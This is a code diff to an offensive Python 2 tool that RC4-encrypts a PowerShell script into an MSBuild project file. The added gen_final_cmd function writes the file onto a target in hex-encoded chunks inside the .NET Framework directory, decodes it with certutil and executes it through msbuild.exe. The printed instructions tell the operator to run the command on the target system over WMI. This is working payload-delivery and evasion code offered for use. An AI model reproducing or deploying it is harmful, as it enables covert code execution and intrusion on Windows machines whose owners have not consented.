@@ -16,7 +16,7 @@ class Generator:
 		self.banner()
 		self.data = self.load_file(path, True)
 		self.rand_vars()
-		
+		self.chunk_size = 1024		
 	def clearscreen(self):
 		os.system("clear")	
 
@@ -78,6 +78,26 @@ class Generator:
 		self.error = 0
 		return current
 		
+
+	def gen_final_cmd(self, path):
+		payload = ""
+		size = 0
+
+		filepath = []
+		filepath.append(self.gen_str(random.randrange(5, 25)))
+		filepath.append(self.gen_str(random.randrange(5, 25)))
+
+		data = self.load_file(path).encode("hex")
+		for chunk in re.findall("." * self.chunk_size, data):
+		        payload += "echo %s >> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\%s && " % (chunk, filepath[0])
+		        size += self.chunk_size
+
+		if len(data) > size:
+			payload += "echo %s >> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\%s" % (data[(len(data) - size) * -1:], filepath[0])
+
+		payload += " && certutil -decodehex C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\%s C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\%s && cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ && msbuild.exe %s" % (filepath[0], filepath[1], filepath[1])
+		return payload
+
 class RC4:
 
 	def KSA(self, key):
@@ -126,7 +146,7 @@ if __name__ == "__main__":
 			powershell = gen.capture_input("Path to the PowerShell script")
 			powershell = gen.load_file(powershell, False)
 		
-		outfile = gen.capture_input("Path for the output MsBuild file")
+		outfile = gen.capture_input("Path for the generated MsBuild out file")
 		cipher = base64.b64encode(rc4.Encrypt(powershell, key))
 		output = gen.get_output()
 		output = output.replace("[KEY]", gen.format_rc4_key(key)).replace("[PAYLOAD]", cipher)
@@ -134,10 +154,14 @@ if __name__ == "__main__":
 			open(outfile, "wb").write(output)
 		except:
 			gen.print_error("Failed to write the output to %s" % outfile)
-		print "\nUpload %s on the target system through SMB" % outfile.split("/")[-1]
-		print "Run the following command on the target system using WMI:"
-		print "cmd /c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe %s" % outfile.split("/")[-1]
-			
+
+		outcmd = gen.gen_final_cmd(outfile)
+		try:
+			open(outfile + ".cmd", "wb").write(outcmd)
+		except:
+			gen.print_error("Failed to write the output to %s.cmd" % outfile)
+
+		print "\n\n[+] %s was generated.\n[+] %s.cmd was generated.\n[+] Run the command inside of %s.cmd on the target system using WMI." % (outfile, outfile, outfile)			
 	except KeyboardInterrupt:
 			print ""
 			gen.print_error("Exiting")
